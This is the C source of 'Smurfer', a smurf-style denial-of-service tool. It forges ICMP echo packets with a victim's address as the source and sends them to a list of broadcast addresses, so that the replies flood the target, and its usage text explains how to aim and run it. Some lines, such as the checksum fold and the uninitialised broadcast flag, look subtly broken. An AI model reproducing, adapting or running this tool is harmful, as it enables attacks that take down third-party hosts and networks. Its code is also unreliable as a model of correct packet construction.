//Get your bacast.txt file in place for DDoS

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
 
void banner(void);
void usage(char *);
void smurf(int, struct sockaddr_in, u_long, int);
void ctrlc(int);
unsigned short in_chksum(u_short *, int);
 
/* stamp */
char id[] = "Packet Gun, Smurfer, idea taken from TFreak's Smurf.c";
 
int main (int argc, char *argv[])
{
   struct sockaddr_in sin;
   struct hostent *he;
   FILE   *bcastfile;
   int    i, sock, bcast, delay, num, pktsize, cycle = 0, x;
   char   buf[32], **bcastaddr = malloc(8192);
 
   banner();
   signal(SIGINT, ctrlc);
 
   if (argc < 6) usage(argv[0]);
 
   if ((he = gethostbyname(argv[1])) == NULL) {
      perror("resolving source host");
      exit(-1);
   }
   memcpy((caddr_t)&sin.sin_addr, he->h_addr, he->h_length);
   sin.sin_family = AF_INET;
   sin.sin_port = htons(0);
 
   num = atoi(argv[3]);
   delay = atoi(argv[4]);
   pktsize = atoi(argv[5]);
 
   if ((bcastfile = fopen(argv[2], "r")) == NULL) {
      perror("opening bcast file");
      exit(-1);
   }
   x = 0;
   while (!feof(bcastfile)) {
      fgets(buf, 32, bcastfile);
      if (buf[0] == '#' || buf[0] == '\n' || ! isdigit(buf[0])) continue;
      for (i = 0; i < strlen(buf); i++)
          if (buf[i] == '\n') buf[i] = '\0';
      bcastaddr[x] = malloc(32);
      strcpy(bcastaddr[x], buf);
      x++;
   }
   bcastaddr[x] = 0x0;
   fclose(bcastfile);
 
   if (x == 0) {
      fprintf(stderr, "ERROR: no broadcasts found in file %s\n\n", argv[2]);
      exit(-1);
   }
   if (pktsize > 1024) {
      fprintf(stderr, "ERROR: packet size must be < 1024\n\n");
      exit(-1);
   }
 
   if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
      perror("getting socket");
      exit(-1);
   }
   setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *)&bcast, sizeof(bcast));
 
   printf("Flooding %s (. = 25 outgoing packets)\n", argv[1]);
 
   for (i = 0; i < num || !num; i++) {
      if (!(i % 25)) { printf("."); fflush(stdout); }
      smurf(sock, sin, inet_addr(bcastaddr[cycle]), pktsize);
      cycle++;
      if (bcastaddr[cycle] == 0x0) cycle = 0;
      usleep(delay);
   }
   puts("\n\n");
   return 0;
}
 
void banner (void)
{
   puts("\nSmurfer by TheWiseThinker\n");
}
 
void usage (char *prog)
{
   fprintf(stderr, "usage: %s <target> <bcast file>" 
                   "<num packets> <packet delay> <packet size>\n\n"
                   "target        = address to hit\n"
                   "bcast file    = file to read broadcast addresses from\n"
                   "num packets   = number of packets to send (0 = flood)\n"
                   "packet delay  = wait between each packet (in ms)\n"
                   "packet size   = size of packet (< 1024)\n\n", prog);
   exit(-1);
}
 
void smurf (int sock, struct sockaddr_in sin, u_long dest, int psize)
{
   struct iphdr *ip;
   struct icmphdr *icmp;
   char *packet;
 
   packet = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
   ip = (struct iphdr *)packet;
   icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
 
   memset(packet, 0, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
 
   ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
   ip->ihl = 5;
   ip->version = 4;
   ip->ttl = 255;
   ip->tos = 0;
   ip->frag_off = 0;
   ip->protocol = IPPROTO_ICMP;
   ip->saddr = sin.sin_addr.s_addr;
   ip->daddr = dest;
   ip->check = in_chksum((u_short *)ip, sizeof(struct iphdr));
   icmp->type = 8;
   icmp->code = 0;
   icmp->checksum = in_chksum((u_short *)icmp, sizeof(struct icmphdr) + psize);
 
   sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize,
          0, (struct sockaddr *)&sin, sizeof(struct sockaddr));
 
   free(packet);          
}
 
void ctrlc (int ignored)
{
   puts("\nDone!\n");
   exit(1);
}
 
unsigned short in_chksum (u_short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;
 
   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }
 
   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }
 
   sum = (sum >> 16) + (sum + 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}